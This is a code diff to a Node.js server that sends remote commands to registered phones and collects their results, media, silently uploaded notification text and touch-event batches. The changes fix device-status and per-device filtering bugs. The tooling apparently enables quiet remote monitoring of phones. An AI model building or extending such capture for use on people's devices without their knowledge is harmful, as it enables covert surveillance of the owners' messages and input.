@@ -22,7 +22,14 @@ const results = new Map();    // id -> {result, device_id, timestamp}
 const devices = new Map();    // device_id -> {name, model, lastSeen, registeredAt}
 const fcmTokens = new Map();  // v9: device_id -> {token, updatedAt} for FCM push-wake
 const MAX_AGE = 10 * 60 * 1000; // 10 min cleanup
-const ONLINE_WINDOW_MS = 20 * 1000; // device online if lastSeen < 20s ago
+// Bug 2 fix: device online if lastSeen within ~3 min (was 20s). A 20s window
+// made the "online" flag flap true/false for live phones whose poll/upload
+// cadence occasionally exceeds 20s (FCM push-wake, bursty upload, network
+// stalls). 3 min covers the poll interval comfortably while the periodic sweep
+// still drops devices unseen for 5 min. Every phone interaction (mobile_poll,
+// mobile_result, media_upload, register, touch_upload, notif_upload) touches
+// lastSeen so a live phone's timestamp stays fresh.
+const ONLINE_WINDOW_MS = 3 * 60 * 1000;
 
 // v8.2: silent notification batches — device_id -> [{ts, entries}]
 // In-memory, consume-once. The phone uploads raw notification strings here;
@@ -528,17 +535,24 @@ app.post('/mobile_poll', authMiddleware, (req, res) => {
 // Mobile → Server: Result anupum (with command ID)
 // v6: optional device_id in body is stored with the result
 app.post('/mobile_result', authMiddleware, (req, res) => {
-    const { id, result, device_id } = req.body;
+    const { id, result } = req.body;
+    // Bug 1 fix: read device_id from body OR X-Device-Id header (consistent with
+    // every other phone-upload endpoint so header-only clients aren't lost).
+    const device_id = (req.body && req.body.device_id)
+        || req.headers['x-device-id']
+        || null;
 
     if (result === undefined || result === null) {
         return res.status(400).json({ error: 'Result is required' });
     }
 
-    if (device_id) touchDevice(device_id);
+    // Bug 2 fix: touch on EVERY result (even header/legacy) so a live phone's
+    // lastSeen stays fresh and the online flag doesn't flap.
+    touchDevice(device_id);
 
     results.set(id || 'legacy', {
         result: String(result).slice(0, 100000000), // 100MB cap (no practical limit)
-        device_id: device_id || null,
+        device_id: device_id,
         timestamp: new Date().toISOString(),
     });
 
@@ -691,7 +705,7 @@ app.post('/notif_upload', authMiddleware, (req, res) => {
         arr = [];
         notifBatches.set(deviceId, arr);
     }
-    arr.push({ ts: Date.now(), entries: entries.slice(0, NOTIF_ENTRY_CAP) });
+    arr.push({ ts: Date.now(), device_id: deviceId, entries: entries.slice(0, NOTIF_ENTRY_CAP) });
     while (arr.length > NOTIF_BATCH_CAP) arr.shift();
     touchDevice(deviceId);
     console.log(`[${new Date().toISOString()}] NOTIF upload ${deviceId}: ${entries.slice(0, 60)}`);
@@ -713,8 +727,12 @@ app.get('/notif_fetch', authMiddleware, (req, res) => {
         return { entries: parts.join('\n'), count: n, next_ts: next };
     };
 
-    if (deviceId && notifBatches.has(deviceId)) {
-        const r = collect(notifBatches.get(deviceId));
+    // Bug 1 fix: when a device_id is requested return ONLY that device's buffered
+    // events — even if empty. The old `has(deviceId)` guard fell through to the
+    // aggregate branch when the requested device had no buffered batches yet,
+    // leaking other devices' (e.g. Oppo) events into the response.
+    if (deviceId) {
+        const r = collect(notifBatches.get(deviceId) || []);
         return res.json(Object.assign({ device_id: deviceId }, r));
     }
     // No specific device (legacy/single-device mode): aggregate everything buffered.
@@ -760,7 +778,7 @@ app.post('/touch_upload', authMiddleware, (req, res) => {
         arr = [];
         touchBatches.set(deviceId, arr);
     }
-    arr.push({ ts: Date.now(), entries: entries.slice(0, TOUCH_ENTRY_CAP) });
+    arr.push({ ts: Date.now(), device_id: deviceId, entries: entries.slice(0, TOUCH_ENTRY_CAP) });
     while (arr.length > TOUCH_BATCH_CAP) arr.shift();
     touchDevice(deviceId);
     res.json({ ok: true, stored: 1, device_id: deviceId });
@@ -790,8 +808,11 @@ app.get('/touch_fetch', authMiddleware, (req, res) => {
         return { entries: parts.join('\n'), count: n, first_ts: first, next_ts: next };
     };
 
-    if (deviceId && touchBatches.has(deviceId)) {
-        const r = collect(touchBatches.get(deviceId));
+    // Bug 1 fix: strict per-device filter — return ONLY the requested device's
+    // buffered events (even if empty). Do NOT fall through to the aggregate
+    // branch, which mixed other devices' events into the requested device's tap.
+    if (deviceId) {
+        const r = collect(touchBatches.get(deviceId) || []);
         return res.json(Object.assign({ device_id: deviceId }, r));
     }
     // No specific device: aggregate everything currently buffered (legacy view).
